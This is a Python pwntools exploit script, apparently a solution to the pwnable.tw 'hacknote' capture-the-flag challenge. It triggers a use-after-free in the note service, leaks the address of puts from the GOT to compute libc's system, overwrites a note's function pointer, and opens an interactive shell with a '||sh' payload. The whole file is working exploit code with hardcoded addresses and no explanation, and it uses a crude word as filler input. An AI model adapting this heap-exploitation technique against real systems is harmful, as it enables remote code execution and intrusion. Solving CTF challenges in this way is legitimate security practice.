#!/usr/bin/env python2
from pwn import *
context(arch = 'i386', os = 'linux')

ready = True
if ready:
    conn = connect('chall.pwnable.tw', 10102)
else:
    conn = process('/home/doublesine/Desktop/hacknote')

def ConnRead():
    sleep(1)
    read = conn.read()
    print read,
    return read

def ConnSendRaw(s):
    conn.send_raw(s)
    print s,


lpfn_PrintNote = 0x0804862B
GOT_plt_puts_addr = 0x0804A024
libc_puts_addr = 0x0005F140
libc_system_addr = 0x0003A940

# add note 0, content size = 128
ConnRead()
ConnSendRaw('1\n')
ConnRead()
ConnSendRaw('128\n')
ConnRead()
ConnSendRaw('fuck\n')

# add note 1, content size = 128
ConnRead()
ConnSendRaw('1\n')
ConnRead()
ConnSendRaw('128\n')
ConnRead()
ConnSendRaw('fuck\n')

# delete note 1
ConnRead()
ConnSendRaw('2\n')
ConnRead()
ConnSendRaw('1\n')

# delete note 0
ConnRead()
ConnSendRaw('2\n')
ConnRead()
ConnSendRaw('0\n')

# add note 2, content size = 8
ConnRead()
ConnSendRaw('1\n')
ConnRead()
ConnSendRaw('8\n')
ConnRead()
ConnSendRaw(pack(lpfn_PrintNote, 32) + pack(GOT_plt_puts_addr, 32) + '\n')

# read note 1
ConnRead()
ConnSendRaw('3\n')
ConnRead()
ConnSendRaw('1\n')

# delete note 2
read = ConnRead()
libc_reloc_offset = unpack(read[0:4], 32) - libc_puts_addr
libc_puts_addr += libc_reloc_offset
libc_system_addr += libc_reloc_offset
ConnSendRaw('2\n')
print('libc_reloc_offset = 0x%08x' % libc_reloc_offset)
print('libc_puts_addr = 0x%08x' % libc_puts_addr)
print('libc_system_addr = 0x%08x' % libc_system_addr)
ConnRead()
ConnSendRaw('2\n')

# add note 3, content size = 8
ConnRead()
ConnSendRaw('1\n')
ConnRead()
ConnSendRaw('8\n')
ConnRead()
ConnSendRaw(pack(libc_system_addr, 32) + '||sh\n')

# read note 1
ConnRead()
ConnSendRaw('3\n')
ConnRead()
ConnSendRaw('1\n')

conn.interactive()
conn.close()
